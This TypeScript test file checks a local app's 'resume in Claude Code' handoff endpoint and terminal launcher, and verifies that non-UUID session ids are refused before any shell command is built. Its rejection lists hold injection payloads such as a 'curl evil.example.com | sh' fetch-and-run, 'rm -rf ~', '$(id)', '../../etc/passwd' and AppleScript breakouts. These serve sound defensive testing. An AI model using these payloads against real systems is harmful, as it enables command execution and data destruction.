/**
 * "Continue in Claude Code" — src/server.ts.
 *
 * This is the app's only command-execution surface, so the tests here are mostly about
 * what must NOT happen. Two things are proved separately, because they are separately
 * reachable:
 *
 *   1. the ENDPOINT refuses a session id that is not a canonical UUID, before it builds
 *      a command or reaches the launch gate;
 *   2. the LAUNCHER refuses the same thing on its own, so a future caller that forgets
 *      the route's check still cannot get a shell.
 *
 * Nothing in this file ever opens a terminal: the launch permission is granted only by
 * the Mac app (an env var it hands the server), and a test process never has it. That is
 * asserted up front rather than assumed.
 */
import './helpers/env.js';
import { assertIsolated } from './helpers/env.js';
import test, { after, before } from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import net from 'node:net';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { raw, resetDb, seedThread } from './helpers/fixtures.js';

const db = await import('../src/db.js');
assertIsolated(db.DB_PATH);

/** The directory src/server.ts computes for itself — the one the command must cd to. */
const PROJECT_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');

async function freePort(): Promise<number> {
  return new Promise((resolve, reject) => {
    const probe = net.createServer();
    probe.on('error', reject);
    probe.listen(0, '127.0.0.1', () => {
      const addr = probe.address();
      const port = typeof addr === 'object' && addr !== null ? addr.port : 0;
      probe.close(() => resolve(port));
    });
  });
}

const PORT = await freePort();
assert.notEqual(PORT, 5252, 'refusing to test on the live app port');

const servers: http.Server[] = [];
const realCreateServer = http.createServer;
(http as { createServer: typeof http.createServer }).createServer = ((
  ...args: Parameters<typeof http.createServer>
) => {
  const server = realCreateServer(...(args as Parameters<typeof http.createServer>));
  servers.push(server);
  return server;
}) as typeof http.createServer;

const {
  isResumableSessionId,
  launchResumeInTerminal,
  resumeCommand,
  startServer,
  terminalLaunchAllowed,
} = await import('../src/server.js');

// Belt and braces: if this were ever true, the POST tests below would open real windows.
assert.equal(
  terminalLaunchAllowed(),
  false,
  'a test process must never hold the terminal-launch permission',
);

interface Reply {
  status: number;
  headers: http.IncomingHttpHeaders;
  body: string;
}

function request(opts: {
  path: string;
  method?: string;
  host?: string;
  token?: string | null;
  body?: string;
}): Promise<Reply> {
  return new Promise((resolve, reject) => {
    const headers: Record<string, string> = { host: opts.host ?? `127.0.0.1:${PORT}` };
    if (opts.token != null) headers['x-copilot-token'] = opts.token;
    if (opts.body !== undefined) {
      headers['content-type'] = 'application/json';
      headers['content-length'] = String(Buffer.byteLength(opts.body));
    }
    const req = http.request(
      { host: '127.0.0.1', port: PORT, path: opts.path, method: opts.method ?? 'GET', headers },
      (res) => {
        let body = '';
        res.setEncoding('utf8');
        res.on('data', (c: string) => (body += c));
        res.on('end', () => resolve({ status: res.statusCode ?? 0, headers: res.headers, body }));
      },
    );
    req.on('error', reject);
    if (opts.body !== undefined) req.write(opts.body);
    req.end();
  });
}

let TOKEN = '';

before(async () => {
  resetDb();
  await startServer(PORT);
  const home = await request({ path: '/' });
  const match = /const COPILOT_TOKEN = '([0-9a-f]{64})'/.exec(home.body);
  assert.ok(match, 'expected the per-run token to be injected into index.html');
  TOKEN = match[1];
});

after(() => {
  for (const s of servers) {
    s.closeAllConnections?.();
    s.close();
  }
  (http as { createServer: typeof http.createServer }).createServer = realCreateServer;
});

/* ------------------------------------------------------------------ seeds -- */

const CHAT_SESSION = '11111111-2222-4333-8444-555555555555';
const ANALYSIS_SESSION = 'aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee';

function seedChatSession(threadId: number, sessionId: string | null): void {
  raw()
    .prepare(
      `INSERT INTO chat_sessions (thread_id, session_id, covered_ts, created_at, updated_at)
       VALUES (?, ?, ?, ?, ?)
       ON CONFLICT(thread_id) DO UPDATE SET session_id = excluded.session_id`,
    )
    .run(threadId, sessionId, null, '2026-01-01T00:00:00.000Z', '2026-01-01T00:00:00.000Z');
}

function seedAnalysis(threadId: number, sessionId: string | null): void {
  raw()
    .prepare(
      `INSERT INTO analyses (thread_id, urgency, why, summary, suggested_action,
                             context_notes, covered_through_ts, analyzed_at, session_id)
       VALUES (?, 'P2', 'why', 'summary', 'action', NULL, '1000.000100', '2026-01-01T00:00:00.000Z', ?)
       ON CONFLICT(thread_id) DO UPDATE SET session_id = excluded.session_id`,
    )
    .run(threadId, sessionId);
}

/* ================================ the UUID gate ============================ */

test('isResumableSessionId accepts a canonical session id, in either case', () => {
  assert.equal(isResumableSessionId('0fe71944-5be6-4401-b7a7-4f1e98588d62'), true);
  assert.equal(isResumableSessionId('0FE71944-5BE6-4401-B7A7-4F1E98588D62'), true);
  assert.equal(isResumableSessionId(CHAT_SESSION), true);
});

test('isResumableSessionId rejects everything that is not exactly one', () => {
  const good = '0fe71944-5be6-4401-b7a7-4f1e98588d62';
  const bad: unknown[] = [
    null,
    undefined,
    42,
    {},
    [good],
    '',
    '   ',
    good.slice(0, -1), // one short
    `${good}0`, // one long
    good.replace(/-/g, ''), // no dashes
    `{${good}}`, // braced
    `urn:uuid:${good}`,
    ` ${good}`,
    `${good} `,
    `${good}\n`, // trailing newline — the classic regex-anchor bug
    `${good}\nrm -rf ~`,
    `\n${good}`,
    `${good}; open -a Calculator`,
    `${good} && curl evil.example.com | sh`,
    `${good}$(id)`,
    `${good}\`id\``,
    `${good}'`,
    `${good}"`,
    '$(id)',
    '../../etc/passwd',
    'g0e71944-5be6-4401-b7a7-4f1e98588d62', // 'g' is not hex
    '0fe71944_5be6_4401_b7a7_4f1e98588d62',
  ];
  for (const value of bad) {
    assert.equal(isResumableSessionId(value), false, `should have been refused: ${String(value)}`);
  }
});

/* ============================== the command ================================ */

test('resumeCommand cds to the project first, then resumes by id', () => {
  const cmd = resumeCommand(CHAT_SESSION);
  assert.equal(cmd, `cd '${PROJECT_ROOT}' && claude --resume ${CHAT_SESSION}`);
  // The cd is the whole reason this works: Claude Code files sessions by working
  // directory, so resuming from anywhere else would not find the transcript.
  assert.ok(cmd.startsWith(`cd '${PROJECT_ROOT}'`));
  assert.ok(cmd.endsWith(CHAT_SESSION));
});

test('resumeCommand single-quotes the directory, so a path can never break out', () => {
  assert.equal(
    resumeCommand(CHAT_SESSION, "/Users/someone/it's mine"),
    `cd '/Users/someone/it'\\''s mine' && claude --resume ${CHAT_SESSION}`,
  );
  assert.equal(
    resumeCommand(CHAT_SESSION, '/tmp/a b; rm -rf ~'),
    `cd '/tmp/a b; rm -rf ~' && claude --resume ${CHAT_SESSION}`,
  );
});

test('resumeCommand refuses to build anything from a non-UUID', () => {
  for (const bad of ['', 'nope', '0fe71944-5be6-4401-b7a7-4f1e98588d62; id', '$(id)']) {
    assert.throws(
      () => resumeCommand(bad),
      /refusing to build a resume command for a non-UUID session id/,
      bad,
    );
  }
});

/* ============================== the launcher =============================== */

test('the launcher refuses a non-UUID session id on its own, before it spawns anything', async () => {
  for (const bad of [
    '',
    'nope',
    '0fe71944-5be6-4401-b7a7-4f1e98588d62; open -a Calculator',
    '0fe71944-5be6-4401-b7a7-4f1e98588d62"\nactivate\ndo script "id',
    '$(id)',
  ]) {
    await assert.rejects(
      () => launchResumeInTerminal(bad),
      /refusing to launch a terminal for a non-UUID session id/,
      bad,
    );
  }
});

test('terminalLaunchAllowed is granted only by the Mac app, never by a plain server', () => {
  const before = process.env.COPILOT_CAN_LAUNCH_TERMINAL;
  try {
    delete process.env.COPILOT_CAN_LAUNCH_TERMINAL;
    assert.equal(terminalLaunchAllowed(), false, 'no grant in the environment');

    process.env.COPILOT_CAN_LAUNCH_TERMINAL = '1';
    assert.equal(terminalLaunchAllowed(), process.platform === 'darwin');

    // Anything other than the exact grant is not a grant.
    for (const value of ['0', 'true', 'yes', '']) {
      process.env.COPILOT_CAN_LAUNCH_TERMINAL = value;
      assert.equal(terminalLaunchAllowed(), false, `env=${JSON.stringify(value)}`);
    }
  } finally {
    if (before === undefined) delete process.env.COPILOT_CAN_LAUNCH_TERMINAL;
    else process.env.COPILOT_CAN_LAUNCH_TERMINAL = before;
    // Nothing after this point may run with the permission held.
    assert.equal(terminalLaunchAllowed(), false);
  }
});

/* ================================ the routes =============================== */

test('handoff sits behind the token and the Host allowlist like every other route', async () => {
  resetDb();
  const id = seedThread();
  for (const method of ['GET', 'POST']) {
    const body = method === 'POST' ? '{"target":"chat"}' : undefined;
    const noToken = await request({ path: `/api/thread/${id}/handoff`, method, body });
    assert.equal(noToken.status, 401, method);
    assert.deepEqual(JSON.parse(noToken.body), { error: 'missing or invalid x-copilot-token' });

    const forged = await request({
      path: `/api/thread/${id}/handoff`,
      method,
      body,
      token: TOKEN,
      host: 'evil.example.com',
    });
    assert.equal(forged.status, 403, method);
    assert.match(forged.body, /Forbidden: unexpected Host header/);
  }
});

test('GET handoff validates the thread id and 404s on an unknown thread', async () => {
  for (const bad of ['0', '-1', 'abc', '1.5']) {
    const res = await request({ path: `/api/thread/${bad}/handoff`, token: TOKEN });
    assert.equal(res.status, 400, bad);
    assert.deepEqual(JSON.parse(res.body), { error: 'invalid thread id' });
  }
  const missing = await request({ path: '/api/thread/999999/handoff', token: TOKEN });
  assert.equal(missing.status, 404);
  assert.deepEqual(JSON.parse(missing.body), { error: 'thread not found' });
});

test('GET handoff offers nothing when neither session exists', async () => {
  resetDb();
  const id = seedThread();
  const res = await request({ path: `/api/thread/${id}/handoff`, token: TOKEN });
  assert.equal(res.status, 200);
  assert.deepEqual(JSON.parse(res.body), { chat: null, analysis: null, canLaunch: false });
});

test('GET handoff returns each session with the exact command for it', async () => {
  resetDb();
  const id = seedThread();
  seedChatSession(id, CHAT_SESSION);
  seedAnalysis(id, ANALYSIS_SESSION);

  const res = await request({ path: `/api/thread/${id}/handoff`, token: TOKEN });
  assert.equal(res.status, 200);
  assert.deepEqual(JSON.parse(res.body), {
    chat: {
      sessionId: CHAT_SESSION,
      command: `cd '${PROJECT_ROOT}' && claude --resume ${CHAT_SESSION}`,
    },
    analysis: {
      sessionId: ANALYSIS_SESSION,
      command: `cd '${PROJECT_ROOT}' && claude --resume ${ANALYSIS_SESSION}`,
    },
    // false in this process: only the Mac app grants it.
    canLaunch: false,
  });
});

test('GET handoff reports the two slots independently', async () => {
  resetDb();
  const chatOnly = seedThread();
  seedChatSession(chatOnly, CHAT_SESSION);
  const a = JSON.parse((await request({ path: `/api/thread/${chatOnly}/handoff`, token: TOKEN })).body) as {
    chat: unknown;
    analysis: unknown;
  };
  assert.notEqual(a.chat, null);
  assert.equal(a.analysis, null);

  const analysisOnly = seedThread({ channel_id: 'C2', thread_ts: '2000.000200' });
  seedAnalysis(analysisOnly, ANALYSIS_SESSION);
  const b = JSON.parse(
    (await request({ path: `/api/thread/${analysisOnly}/handoff`, token: TOKEN })).body,
  ) as { chat: unknown; analysis: unknown };
  assert.equal(b.chat, null);
  assert.notEqual(b.analysis, null);
});

test('GET handoff drops a stored session id that is not a session id', async () => {
  resetDb();
  const id = seedThread();
  // Exactly the shape an injection would take if the database were poisoned upstream.
  seedChatSession(id, `${CHAT_SESSION}; open -a Calculator`);
  seedAnalysis(id, 'not-a-uuid');

  const res = await request({ path: `/api/thread/${id}/handoff`, token: TOKEN });
  assert.equal(res.status, 200);
  assert.deepEqual(JSON.parse(res.body), { chat: null, analysis: null, canLaunch: false });
  assert.doesNotMatch(res.body, /Calculator/, 'a rejected id must not be echoed back either');
});

test('POST handoff validates the target', async () => {
  resetDb();
  const id = seedThread();
  seedChatSession(id, CHAT_SESSION);
  for (const body of ['{}', '{"target":"analysis "}', '{"target":"Chat"}', '{"target":1}', '{"target":null}', '{"target":["chat"]}']) {
    const res = await request({ path: `/api/thread/${id}/handoff`, method: 'POST', token: TOKEN, body });
    assert.equal(res.status, 400, body);
    assert.deepEqual(JSON.parse(res.body), { error: "target must be 'chat' or 'analysis'" });
  }
});

test('POST handoff 404s when the thread, or that thread\'s session, does not exist', async () => {
  resetDb();
  const id = seedThread();
  const noThread = await request({
    path: '/api/thread/999999/handoff',
    method: 'POST',
    token: TOKEN,
    body: '{"target":"chat"}',
  });
  assert.equal(noThread.status, 404);
  assert.deepEqual(JSON.parse(noThread.body), { error: 'thread not found' });

  for (const target of ['chat', 'analysis']) {
    const res = await request({
      path: `/api/thread/${id}/handoff`,
      method: 'POST',
      token: TOKEN,
      body: JSON.stringify({ target }),
    });
    assert.equal(res.status, 404, target);
    const out = JSON.parse(res.body) as { error: string; message: string };
    assert.equal(out.error, 'no_session');
    assert.ok(out.message.length > 0, 'the refusal is written for a person to read');
  }
});

test('POST handoff refuses a non-UUID session id before it can reach a terminal', async () => {
  resetDb();
  const id = seedThread();
  const payloads = [
    `${CHAT_SESSION}; open -a Calculator`,
    `${CHAT_SESSION}\nopen -a Calculator`,
    `${CHAT_SESSION}" & do shell script "open -a Calculator`,
    '$(open -a Calculator)',
    'nope',
  ];
  for (const poison of payloads) {
    seedChatSession(id, poison);
    seedAnalysis(id, poison);
    for (const target of ['chat', 'analysis']) {
      const res = await request({
        path: `/api/thread/${id}/handoff`,
        method: 'POST',
        token: TOKEN,
        body: JSON.stringify({ target }),
      });
      assert.equal(res.status, 400, `${target}: ${poison}`);
      const out = JSON.parse(res.body) as { error: string; message: string; command?: string };
      assert.equal(out.error, 'invalid_session_id');
      assert.equal(out.command, undefined, 'a refused id never becomes a command, not even to show');
      assert.doesNotMatch(res.body, /Calculator|claude --resume/);
    }
  }
});

test('POST handoff hands back the command instead of launching when it cannot launch', async () => {
  resetDb();
  const id = seedThread();
  seedChatSession(id, CHAT_SESSION);
  seedAnalysis(id, ANALYSIS_SESSION);

  for (const [target, session] of [
    ['chat', CHAT_SESSION],
    ['analysis', ANALYSIS_SESSION],
  ] as const) {
    const res = await request({
      path: `/api/thread/${id}/handoff`,
      method: 'POST',
      token: TOKEN,
      body: JSON.stringify({ target }),
    });
    // 503, not 500: nothing is broken — this server simply is not the Mac app, so the
    // page shows the command with a Copy button instead.
    assert.equal(res.status, 503, target);
    const out = JSON.parse(res.body) as { error: string; message: string; command: string };
    assert.equal(out.error, 'cannot_launch');
    assert.equal(out.command, `cd '${PROJECT_ROOT}' && claude --resume ${session}`);
    assert.ok(out.message.length > 0);
  }
});

test('a malformed handoff body is a 400 from the parser, never a launch', async () => {
  resetDb();
  const id = seedThread();
  seedChatSession(id, CHAT_SESSION);
  const res = await request({
    path: `/api/thread/${id}/handoff`,
    method: 'POST',
    token: TOKEN,
    body: '{"target":"chat"',
  });
  assert.equal(res.status, 400);
  assert.deepEqual(JSON.parse(res.body), { error: 'invalid JSON' });
});
